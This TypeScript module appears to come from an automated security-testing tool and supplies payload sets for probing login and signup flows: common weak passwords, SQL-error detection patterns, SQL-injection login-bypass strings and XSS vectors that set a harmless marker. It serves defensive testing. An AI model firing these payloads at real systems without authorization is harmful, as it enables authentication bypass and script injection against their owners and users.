/**
 * Payload sets specific to auth-attack scenarios. We reuse the
 * generic `SQLI_PAYLOADS` / `XSS_PAYLOADS` exports from
 * `../payloads.ts` but add purpose-built lists for weak passwords
 * and an internal helper for generating one-shot test emails.
 */

/**
 * Top entries from NIST / Have-I-Been-Pwned breach datasets, capped
 * to the kind of password a casual user might pick. NIST SP 800-63B
 * §5.1.1.2 explicitly requires checking against this kind of list
 * before accepting a new password. If your signup flow accepts any
 * of these, that requirement is unmet.
 */
export const WEAK_PASSWORDS: ReadonlyArray<string> = [
  "password",
  "Password1",
  "12345678",
  "qwerty123",
  "letmein!",
  "iloveyou",
  "admin1234",
  "welcome1",
  "passw0rd",
  "aaaaaaaa",
];

/**
 * Credentials we use as "definitely-doesn't-exist" inputs for
 * username-enumeration probes. The `.invalid` TLD is reserved by
 * RFC 2606 so this can never match a real address even by accident.
 */
export const NONEXISTENT_USERNAME = "chaosbringer-noexist-9f3c@example.invalid";

/** Generate a one-shot test email so repeated signups never collide. */
export function freshTestEmail(salt?: string): string {
  const ts = Date.now().toString(36);
  const rand = Math.floor(Math.random() * 0xffff).toString(16);
  const tag = salt ? `+${salt}` : "";
  return `chaosbringer-test${tag}-${ts}-${rand}@example.invalid`;
}

/**
 * SQL error fragments that signal the server piped raw input into a
 * database driver. Conservative — these are SQL-y enough to be high
 * signal (we don't want to flag legitimate copy mentioning the word
 * "syntax").
 */
export const SQL_ERROR_SIGNATURES: ReadonlyArray<RegExp> = [
  /SQL syntax/i,
  /SQLSTATE/i,
  /ORA-\d{4,5}/,
  /MySQL server version for the right syntax/i,
  /PG::SyntaxError/,
  /psycopg2\.errors/i,
  /SQLITE_ERROR/i,
  /unclosed quotation mark/i,
  /sqlite3\.OperationalError/i,
  /System\.Data\.SqlClient/,
];

/**
 * A small SQLi shortlist tailored to auth bypass attempts. The
 * generic `SQLI_PAYLOADS` includes broader payloads that aren't
 * useful in a username/password context (e.g. UNION-based exfil).
 */
export const SQLI_AUTH_BYPASS_PAYLOADS: ReadonlyArray<string> = [
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  "admin'--",
  "admin'/*",
  "' OR 1=1--",
  "\" OR \"1\"=\"1",
];

/**
 * XSS payloads for the credential / display-name attack. We use a
 * marker the page can publish to `window.__cb_xss_fired = true` —
 * the attack reads that marker via `page.evaluate()` to confirm
 * execution. This avoids relying on `dialog` events which apps may
 * block or ignore.
 */
export const XSS_AUTH_MARKER = "__cb_xss_fired";

export const XSS_CREDENTIAL_PAYLOADS: ReadonlyArray<string> = [
  `<img src=x onerror="window.${XSS_AUTH_MARKER}=true">`,
  `"><svg onload="window.${XSS_AUTH_MARKER}=true">`,
  `'><script>window.${XSS_AUTH_MARKER}=true</script>`,
  `javascript:window.${XSS_AUTH_MARKER}=true`,
  `<details open ontoggle="window.${XSS_AUTH_MARKER}=true">`,
];
